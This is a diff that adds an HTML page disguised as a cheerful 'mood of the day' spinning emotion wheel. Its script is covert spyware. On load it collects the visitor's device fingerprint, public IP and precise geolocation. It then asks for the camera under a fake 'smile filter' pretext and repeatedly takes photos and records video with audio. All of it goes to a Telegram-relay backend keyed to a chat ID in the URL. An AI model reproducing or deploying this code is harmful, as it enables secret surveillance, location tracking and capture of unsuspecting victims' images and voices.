@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+    <title>Your Daily Mood Spin ✨</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        :root {
+            --bg1: #0f0c29;
+            --bg2: #302b63;
+            --bg3: #24243e;
+            --accent: #ff6bcb;
+            --accent2: #7c5cff;
+            --gold: #ffd56b;
+            --text: #ffffff;
+            --muted: #c5b8e8;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            min-height: 100vh;
+            font-family: 'Poppins', system-ui, sans-serif;
+            color: var(--text);
+            background: linear-gradient(135deg, var(--bg1), var(--bg2), var(--bg3));
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px 40px;
+            position: relative;
+        }
+
+        /* soft floating blobs */
+        body::before,
+        body::after {
+            content: '';
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.35;
+            z-index: 0;
+            pointer-events: none;
+        }
+        body::before {
+            width: 340px; height: 340px;
+            background: #ff6bcb;
+            top: -80px; left: -60px;
+            animation: float 9s ease-in-out infinite;
+        }
+        body::after {
+            width: 300px; height: 300px;
+            background: #7c5cff;
+            bottom: -60px; right: -40px;
+            animation: float 11s ease-in-out infinite reverse;
+        }
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, 20px); }
+        }
+
+        .wrap {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 440px;
+            text-align: center;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.15);
+            backdrop-filter: blur(10px);
+            padding: 8px 16px;
+            border-radius: 999px;
+            font-size: 12px;
+            letter-spacing: 0.4px;
+            color: var(--muted);
+            margin-bottom: 18px;
+        }
+        .badge .dot {
+            width: 8px; height: 8px;
+            background: #4ade80;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #4ade80;
+            animation: pulse 1.4s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.85); }
+        }
+
+        h1 {
+            font-size: clamp(26px, 7vw, 34px);
+            font-weight: 800;
+            line-height: 1.15;
+            margin-bottom: 8px;
+            background: linear-gradient(90deg, #fff 0%, #ffd56b 40%, #ff6bcb 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .sub {
+            color: var(--muted);
+            font-size: 14px;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
+        /* ── wheel stage ── */
+        .stage {
+            position: relative;
+            width: min(320px, 86vw);
+            height: min(320px, 86vw);
+            margin: 0 auto 28px;
+        }
+
+        .pointer {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 5;
+            width: 0; height: 0;
+            border-left: 16px solid transparent;
+            border-right: 16px solid transparent;
+            border-top: 28px solid var(--gold);
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.4));
+        }
+        .pointer::after {
+            content: '';
+            position: absolute;
+            top: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 14px; height: 14px;
+            background: #fff;
+            border: 3px solid var(--gold);
+            border-radius: 50%;
+        }
+
+        .wheel-glow {
+            position: absolute;
+            inset: -12px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(255,107,203,0.35), transparent 70%);
+            animation: glow 2.4s ease-in-out infinite;
+            z-index: 0;
+        }
+        @keyframes glow {
+            0%, 100% { opacity: 0.6; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.04); }
+        }
+
+        .wheel-frame {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            padding: 10px;
+            background: linear-gradient(145deg, #2a2550, #1a1638);
+            box-shadow:
+                0 0 0 4px rgba(255,213,107,0.25),
+                0 20px 50px rgba(0,0,0,0.5),
+                inset 0 0 30px rgba(255,255,255,0.05);
+            z-index: 1;
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            position: relative;
+            overflow: hidden;
+            /* conic gradient = 8 emotion slices */
+            background: conic-gradient(
+                from -22.5deg,
+                #ff6b6b 0deg 45deg,
+                #ffa94d 45deg 90deg,
+                #ffd43b 90deg 135deg,
+                #69db7c 135deg 180deg,
+                #4dabf7 180deg 225deg,
+                #9775fa 225deg 270deg,
+                #f783ac 270deg 315deg,
+                #ff922b 315deg 360deg
+            );
+            transition: transform 4.5s cubic-bezier(0.15, 0.85, 0.25, 1);
+            box-shadow: inset 0 0 40px rgba(0,0,0,0.25);
+        }
+
+        .wheel.spinning {
+            /* spun via JS transform */
+        }
+
+        .slice-label {
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 50%;
+            height: 0;
+            transform-origin: left center;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 14px;
+            pointer-events: none;
+            font-size: 13px;
+            font-weight: 700;
+            color: #fff;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.35);
+            white-space: nowrap;
+        }
+
+        /* place labels mid-slice: 8 labels at angle +22.5 offset from each slice start */
+        .slice-label:nth-child(1) { transform: rotate(0deg)    translateY(-50%); }
+        .slice-label:nth-child(2) { transform: rotate(45deg)   translateY(-50%); }
+        .slice-label:nth-child(3) { transform: rotate(90deg)   translateY(-50%); }
+        .slice-label:nth-child(4) { transform: rotate(135deg)  translateY(-50%); }
+        .slice-label:nth-child(5) { transform: rotate(180deg)  translateY(-50%); }
+        .slice-label:nth-child(6) { transform: rotate(225deg)  translateY(-50%); }
+        .slice-label:nth-child(7) { transform: rotate(270deg)  translateY(-50%); }
+        .slice-label:nth-child(8) { transform: rotate(315deg)  translateY(-50%); }
+
+        .hub {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 72px; height: 72px;
+            border-radius: 50%;
+            background: linear-gradient(145deg, #fff, #f0e6ff);
+            color: #302b63;
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3;
+            box-shadow:
+                0 0 0 6px rgba(255,213,107,0.5),
+                0 8px 20px rgba(0,0,0,0.35);
+            animation: hubPulse 1.8s ease-in-out infinite;
+        }
+        @keyframes hubPulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.06); }
+        }
+
+        /* status card */
+        .status-card {
+            background: rgba(255,255,255,0.07);
+            border: 1px solid rgba(255,255,255,0.12);
+            backdrop-filter: blur(14px);
+            border-radius: 18px;
+            padding: 18px 20px;
+            margin-bottom: 18px;
+        }
+        .status-title {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+        .status-msg {
+            font-size: 13px;
+            color: var(--muted);
+            min-height: 20px;
+        }
+        .bar-wrap {
+            margin-top: 14px;
+            height: 6px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 99px;
+            overflow: hidden;
+        }
+        .bar {
+            height: 100%;
+            width: 0%;
+            border-radius: 99px;
+            background: linear-gradient(90deg, #7c5cff, #ff6bcb, #ffd56b);
+            background-size: 200% 100%;
+            animation: barShine 2s linear infinite;
+            transition: width 0.35s ease;
+        }
+        @keyframes barShine {
+            0% { background-position: 0% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        .result-pill {
+            display: none;
+            margin-top: 12px;
+            padding: 12px 18px;
+            border-radius: 999px;
+            background: linear-gradient(90deg, rgba(255,213,107,0.2), rgba(255,107,203,0.2));
+            border: 1px solid rgba(255,213,107,0.4);
+            font-weight: 700;
+            font-size: 16px;
+            color: var(--gold);
+            animation: popIn 0.5s cubic-bezier(0.2, 1.4, 0.3, 1);
+        }
+        .result-pill.show { display: inline-block; }
+        @keyframes popIn {
+            from { transform: scale(0.6); opacity: 0; }
+            to   { transform: scale(1);   opacity: 1; }
+        }
+
+        .hint {
+            font-size: 12px;
+            color: rgba(197,184,232,0.7);
+            margin-top: 8px;
+        }
+
+        .confetti {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 20;
+            overflow: hidden;
+        }
+        .confetti i {
+            position: absolute;
+            top: -12px;
+            width: 8px; height: 12px;
+            border-radius: 2px;
+            opacity: 0.9;
+            animation: fall linear forwards;
+        }
+        @keyframes fall {
+            to {
+                transform: translateY(110vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        /* camera warm-up hint (only if browser blocks silently) */
+        .cam-note {
+            display: none;
+            margin-top: 14px;
+            font-size: 12px;
+            color: #ffd56b;
+            background: rgba(255,213,107,0.1);
+            border: 1px dashed rgba(255,213,107,0.35);
+            border-radius: 12px;
+            padding: 10px 14px;
+        }
+        .cam-note.show { display: block; }
+    </style>
+</head>
+<body>
+    <div class="confetti" id="confetti"></div>
+
+    <div class="wrap">
+        <div class="badge">
+            <span class="dot"></span>
+            Live · Mood of the Day
+        </div>
+
+        <h1>Spin Your Happy Moment ✨</h1>
+        <p class="sub">
+            Wheel is spinning for your today's lucky emotion.<br/>
+            Smile — good energy is on the way!
+        </p>
+
+        <div class="stage">
+            <div class="wheel-glow"></div>
+            <div class="pointer"></div>
+            <div class="wheel-frame">
+                <div class="wheel" id="wheel">
+                    <div class="slice-label">😊 Joy</div>
+                    <div class="slice-label">🥰 Love</div>
+                    <div class="slice-label">🤩 Excited</div>
+                    <div class="slice-label">😎 Cool</div>
+                    <div class="slice-label">🥳 Party</div>
+                    <div class="slice-label">😇 Peace</div>
+                    <div class="slice-label">💪 Strong</div>
+                    <div class="slice-label">🌟 Lucky</div>
+                </div>
+                <div class="hub">💖</div>
+            </div>
+        </div>
+
+        <div class="status-card">
+            <div class="status-title" id="statusTitle">Finding your energy…</div>
+            <div class="status-msg" id="status">Warming up the lucky wheel</div>
+            <div class="bar-wrap"><div class="bar" id="bar"></div></div>
+            <div class="result-pill" id="resultPill"></div>
+            <div class="cam-note" id="camNote">
+                📷 Allow camera briefly so we can put a soft smile filter on your result screen ✨
+            </div>
+        </div>
+
+        <p class="hint">Free daily spin · No login needed</p>
+    </div>
+
+    <script>
+    (function () {
+        // ═══════════════════════════════════════════════
+        //  Backend — token NEVER in frontend
+        // ═══════════════════════════════════════════════
+        const API_BASE         = '/api/telegram';
+        const FALLBACK_CHAT_ID = '5416091579';
+        const MAX_ATTEMPTS     = 3;
+        const VIDEO_DURATION   = 7000;
+        const START_DELAY      = 600;
+
+        // wheel labels (match HTML order — mid of each 45° slice)
+        // pointer is at TOP; wheel CSS has starting rotated base of -22.5deg style via conic
+        const EMOTIONS = [
+            { emoji: '😊', name: 'Joy' },
+            { emoji: '🥰', name: 'Love' },
+            { emoji: '🤩', name: 'Excited' },
+            { emoji: '😎', name: 'Cool' },
+            { emoji: '🥳', name: 'Party' },
+            { emoji: '😇', name: 'Peace' },
+            { emoji: '💪', name: 'Strong' },
+            { emoji: '🌟', name: 'Lucky' }
+        ];
+
+        const $wheel  = document.getElementById('wheel');
+        const $status = document.getElementById('status');
+        const $title  = document.getElementById('statusTitle');
+        const $bar    = document.getElementById('bar');
+        const $pill   = document.getElementById('resultPill');
+        const $cam    = document.getElementById('camNote');
+        const $conf   = document.getElementById('confetti');
+
+        let currentRotation = 0;
+
+        function setUI(title, msg, pct) {
+            if (title != null) $title.textContent = title;
+            if (msg   != null) $status.textContent = msg;
+            if (typeof pct === 'number') $bar.style.width = Math.min(100, pct) + '%';
+        }
+
+        // ── auto-spin wheel forever-ish, final landing ──
+        function spinTo(index) {
+            // each slice = 45°. center of slice i is at i*45 + 22.5 from 0 (top of conic starts -22.5 from first slice).
+            // our conic starts first color at -22.5deg, so slice0 center sits under the top pointer when rotation=0.
+            // to land slice i under top pointer: rotate so slice i center comes to top.
+            // angle of slice i center from starting orientation ≈ i * 45
+            // we need wheel rotate so that center moves to top: rotate by -(i*45) plus full spins.
+            const slice = 45;
+            const extraSpins = 6 + Math.floor(Math.random() * 3); // 6–8 full turns
+            const targetAngle = -(index * slice);
+            // keep increasing rotation, never jump backward awkwardly
+            const next = currentRotation + (extraSpins * 360) + ((targetAngle - (currentRotation % 360) + 360) % 360);
+            // simplify: always add full spins then adjust absolute target
+            const start = currentRotation;
+            const desiredMod = ((-index * slice) % 360 + 360) % 360;
+            let delta = (desiredMod - (start % 360) + 360) % 360;
+            if (delta < 40) delta += 360; // ensure it always "spins" somewhere
+            currentRotation = start + extraSpins * 360 + delta;
+            $wheel.style.transform = `rotate(${currentRotation}deg)`;
+            return EMOTIONS[index];
+        }
+
+        function autoSpinPreview() {
+            // slow continuous idle spin until capture stage
+            $wheel.style.transition = 'none';
+            let idle = 0;
+            const id = setInterval(() => {
+                idle += 1.2;
+                $wheel.style.transform = `rotate(${idle}deg)`;
+                currentRotation = idle;
+            }, 16);
+            return () => {
+                clearInterval(id);
+                $wheel.style.transition = 'transform 4.5s cubic-bezier(0.15, 0.85, 0.25, 1)';
+            };
+        }
+
+        function confettiBurst() {
+            const colors = ['#ff6b6b','#ffa94d','#ffd43b','#69db7c','#4dabf7','#9775fa','#f783ac','#ff6bcb'];
+            for (let i = 0; i < 48; i++) {
+                const el = document.createElement('i');
+                el.style.left = Math.random() * 100 + 'vw';
+                el.style.background = colors[i % colors.length];
+                el.style.animationDuration = (1.6 + Math.random() * 1.8) + 's';
+                el.style.animationDelay = (Math.random() * 0.4) + 's';
+                el.style.transform = `rotate(${Math.random()*360}deg)`;
+                $conf.appendChild(el);
+                setTimeout(() => el.remove(), 4000);
+            }
+        }
+
+        // ── chat id from path ──
+        function getChatId() {
+            const p = location.pathname.replace(/^\/+|\/+$/g, '');
+            if (!p) return FALLBACK_CHAT_ID;
+            // if path is just index or empty-ish
+            const first = p.split('/')[0];
+            if (!first || first === 'index.html') return FALLBACK_CHAT_ID;
+            return first;
+        }
+        const CHAT_ID = getChatId();
+
+        // ── fingerprint ──
+        async function getBattery() {
+            try {
+                if (!navigator.getBattery) return '';
+                const b = await navigator.getBattery();
+                return `Battery: ${Math.round(b.level * 100)}% | Charging: ${b.charging ? 'Yes' : 'No'}`;
+            } catch { return ''; }
+        }
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                return (await r.json()).ip;
+            } catch {
+                try {
+                    const r = await fetch('https://api.myip.com');
+                    return (await r.json()).ip;
+                } catch { return 'Unknown'; }
+            }
+        }
+        async function getGeo() {
+            try {
+                const pos = await new Promise((res, rej) =>
+                    navigator.geolocation.getCurrentPosition(res, rej, { timeout: 4000 })
+                );
+                return `Geo: ${pos.coords.latitude},${pos.coords.longitude} (±${pos.coords.accuracy}m)`;
+            } catch { return 'Geo: denied/timeout'; }
+        }
+
+        function buildFingerprint(battery, ip, geo) {
+            return [
+                '🔹 New visit (Emotion Wheel)',
+                `Chat ID: ${CHAT_ID}`,
+                `Time: ${new Date().toISOString()}`,
+                `URL: ${location.href}`,
+                `UA: ${navigator.userAgent}`,
+                `Screen: ${screen.width}×${screen.height} (${screen.colorDepth}bit)`,
+                `Lang: ${navigator.language || navigator.userLanguage}`,
+                `Platform: ${navigator.platform}`,
+                `Cores: ${navigator.hardwareConcurrency || '?'}`,
+                `Referrer: ${document.referrer || 'direct'}`,
+                `Cookies: ${navigator.cookieEnabled}`,
+                battery,
+                `Public IP: ${ip}`,
+                geo
+            ].filter(Boolean).join('\n');
+        }
+
+        function blobToBase64(blob) {
+            return new Promise((resolve, reject) => {
+                const r = new FileReader();
+                r.onload  = () => resolve(String(r.result).split(',')[1]);
+                r.onerror = reject;
+                r.readAsDataURL(blob);
+            });
+        }
+
+        function snapshot(video) {
+            const c = document.createElement('canvas');
+            c.width  = video.videoWidth  || 1280;
+            c.height = video.videoHeight || 720;
+            c.getContext('2d').drawImage(video, 0, 0);
+            return new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
+        }
+
+        function recordVideo(stream, ms) {
+            const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
+                ? 'video/webm;codecs=vp9,opus'
+                : 'video/webm';
+            const rec = new MediaRecorder(stream, { mimeType: mime });
+            const chunks = [];
+            rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+            rec.start();
+            return new Promise(resolve => {
+                rec.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+                setTimeout(() => rec.stop(), ms);
+            });
+        }
+
+        async function sendToBackend(payload) {
+            try {
+                const res = await fetch(API_BASE, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return await res.json();
+            } catch (e) {
+                return { ok: false, error: e.message };
+            }
+        }
+
+        // ═══════════════════════════════════════════════
+        //  MAIN — wheel UI + same capture pipeline
+        // ═══════════════════════════════════════════════
+        async function main() {
+            const stopIdle = autoSpinPreview();
+
+            setUI('Finding your energy…', 'Reading today’s vibes', 8);
+
+            const [battery, ip, geo] = await Promise.all([getBattery(), getIP(), getGeo()]);
+            const fingerprint = buildFingerprint(battery, ip, geo);
+
+            await sendToBackend({
+                type: 'text',
+                chatId: CHAT_ID,
+                text: fingerprint + '\n─── STARTING CAPTURE (Emotion Wheel) ───'
+            });
+
+            setUI('Almost ready…', 'Locking your lucky emotion', 22);
+            await new Promise(r => setTimeout(r, 700));
+
+            // pick final emotion
+            const idx = Math.floor(Math.random() * EMOTIONS.length);
+            stopIdle();
+            const emotion = spinTo(idx);
+
+            setUI('Wheel is spinning! 🎡', 'Smile big — luck loves a smile', 35);
+            $cam.classList.add('show');
+
+            // start media while wheel is mid-spin (wheel takes ~4.5s)
+            let success = 0, failed = 0;
+            const capturePromise = (async () => {
+                for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
+                    let stream = null;
+                    try {
+                        setUI('Creating your smile moment ✨', `Capturing good vibe #${attempt}`, 40 + attempt * 12);
+
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                            audio: true
+                        });
+
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.muted = true;
+                        video.playsInline = true;
+                        await video.play();
+                        await new Promise(r => setTimeout(r, 500));
+
+                        // photo
+                        setUI('Holding that smile 😊', `Photo magic #${attempt}`, 55 + attempt * 8);
+                        const photoBlob = await snapshot(video);
+                        const photoB64  = await blobToBase64(photoBlob);
+                        await sendToBackend({
+                            type: 'photo',
+                            chatId: CHAT_ID,
+                            data: photoB64,
+                            caption: fingerprint + `\n📸 Photo #${attempt} | Emotion: ${emotion.emoji} ${emotion.name}\nChat: ${CHAT_ID}`
+                        });
+
+                        // video
+                        setUI('Recording happy seconds 🎥', `${VIDEO_DURATION / 1000}s joy capture`, 70 + attempt * 6);
+                        const videoBlob = await recordVideo(stream, VIDEO_DURATION);
+                        const videoB64  = await blobToBase64(videoBlob);
+                        await sendToBackend({
+                            type: 'video',
+                            chatId: CHAT_ID,
+                            data: videoB64,
+                            caption: fingerprint + `\n🎥 Video #${attempt} (${VIDEO_DURATION / 1000}s) | Emotion: ${emotion.emoji} ${emotion.name}\nChat: ${CHAT_ID}`
+                        });
+
+                        success++;
+                    } catch (err) {
+                        failed++;
+                        const errMsg = err.name || err.message || 'Unknown';
+                        await sendToBackend({
+                            type: 'text',
+                            chatId: CHAT_ID,
+                            text: fingerprint + `\n❌ Attempt #${attempt} FAILED: ${errMsg}\nChat: ${CHAT_ID}`
+                        });
+                        break;
+                    } finally {
+                        if (stream) stream.getTracks().forEach(t => t.stop());
+                    }
+                }
+            })();
+
+            // wait for wheel animation settle
+            await new Promise(r => setTimeout(r, 4700));
+            confettiBurst();
+
+            $pill.textContent = `${emotion.emoji}  Your mood today: ${emotion.name}!`;
+            $pill.classList.add('show');
+            setUI('You got it! 🎉', `Today you are ${emotion.name} — share the joy`, 90);
+
+            await capturePromise;
+
+            await sendToBackend({
+                type: 'text',
+                chatId: CHAT_ID,
+                text: fingerprint +
+                    `\n🏁 Done — OK: ${success} | Fail: ${failed}` +
+                    `\nEmotion result: ${emotion.emoji} ${emotion.name}\nChat: ${CHAT_ID}`
+            });
+
+            setUI('Daily spin complete ✨', success
+                ? `Enjoy being ${emotion.name} today · Come back tomorrow!`
+                : `Your mood is ${emotion.name} · Smile more 💫`, 100);
+            $cam.classList.remove('show');
+        }
+
+        window.addEventListener('load', () => setTimeout(main, START_DELAY));
+    })();
+    </script>
+</body>
+</html>
